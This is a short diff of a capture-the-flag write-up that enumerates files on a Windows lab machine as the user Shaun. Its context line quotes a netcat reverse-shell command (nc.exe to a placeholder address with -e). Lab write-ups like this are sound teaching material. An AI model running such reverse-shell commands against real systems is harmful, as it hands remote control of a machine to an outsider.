@@ -77,13 +77,14 @@ Opened the port 1234 for incoming connection and execute `nc.exe X.X.X.X 1234 -e
 
 Ok. So I'm logged in windows x64 machine as Shaun. Let's begin or research from Shaun home directory to see what's there
 
-```Plaintext
+```batch
 c:\Users\shaun>dir *.txt or *.exe /s /b
 ...
 c:\Users\shaun\Desktop\user.txt
 ...
 c:\Users\shaun\Downloads\CloudMe_1112.exe                                   
 ```
+
 The command `dir` is used to list files a directory in cmd process. I used the option below to list important files.
 - *.txt or *.exe : search for text and executable banry files 
 - /s : search recursivly 
